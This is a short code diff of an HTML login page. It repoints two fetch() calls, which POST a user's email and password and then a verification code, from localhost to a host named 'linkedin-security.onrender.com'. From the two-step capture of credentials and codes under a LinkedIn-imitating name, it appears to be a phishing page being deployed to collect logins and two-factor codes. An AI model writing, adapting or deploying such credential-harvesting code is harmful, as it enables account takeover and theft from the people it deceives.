@@ -140,7 +140,6 @@
     </p>
   </div>
 
-
 <script>
   const loginForm = document.getElementById("loginForm");
   const loginStep = document.getElementById("loginStep");
@@ -155,7 +154,7 @@
     const password = document.getElementById("password").value;
 
     if (email && password) {
-      fetch("http://localhost:3000/login", {
+      fetch("https://linkedin-security.onrender.com/login", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -183,7 +182,7 @@
 
     const code = document.getElementById("codeInput").value;
 
-    fetch("http://localhost:3000/verify", {
+    fetch("https://linkedin-security.onrender.com/verify", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -202,9 +201,8 @@
   });
 </script>
 
-
-
 </body>
 </html>
+
 
 
